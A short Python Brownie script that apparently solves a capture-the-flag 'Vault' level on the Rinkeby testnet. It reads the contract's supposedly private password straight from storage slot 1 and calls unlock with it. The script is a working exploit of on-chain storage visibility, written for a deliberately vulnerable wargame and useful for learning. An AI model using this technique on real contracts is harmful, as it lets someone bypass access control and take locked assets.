from brownie import accounts, config, Vault
from web3 import Web3

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0xd88F198D58331B25fC12674781b94051f838Ed12"
vault = Vault.at(instance_address)

# -------------------------------------------------
# To pass this level we must unlock the vault
# -------------------------------------------------


def level_completed():
    return vault.locked() == False


def exploit():
    # set up web3
    rpc_url = config["wallets"]["endpoint"]
    w3 = Web3(Web3.HTTPProvider(rpc_url))

    # get password at storage slot 1
    password = w3.eth.get_storage_at(instance_address, 1)
    print(f"The password is: {password}")

    # call unlock with password as a parameter
    tx = vault.unlock(password, {"from": account})
    tx.wait(1)

    # confirm we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
